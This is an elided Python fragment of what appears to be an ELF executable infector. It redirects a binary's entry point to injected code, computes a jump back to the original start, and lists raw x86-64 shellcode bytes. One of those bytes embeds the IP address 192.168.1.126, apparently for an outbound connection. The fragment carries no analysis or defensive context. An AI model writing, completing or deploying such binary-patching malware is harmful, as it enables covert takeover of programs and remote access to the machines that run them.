...
def edit_entry_point():
    ...
    #new_offset = calc_new_offset(ENTRY_POINT,section_index) _start
    new_offset = calc_new_offset(TEXT_INJECT_OFFSET,section_index) # code injection
...
start_location = calc_new_offset(ENTRY_POINT,text_section_index)
print("NEW ENTRY POINTER",hex(start_location))
jmp_to_start = 0xffffffff + 1 - abs(start_location - instruction_pointer)
inject = [
    ...
    0xc7, 0x85, 0xb4, 0xef, 0xff, 0xff, 0xc0, 0xa8, 0x01, 0x7e, # movl $0x7e01a8c0, -0x104c(%rbp)
    ...
    #0xeb, 0xf8, 0x66, 0x2e, 0x0f, 0x1f, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0f, 0x1f, 0x44, 0x00, 0x00,                               # nopl 0x0(%rax,%rax,1)  
]
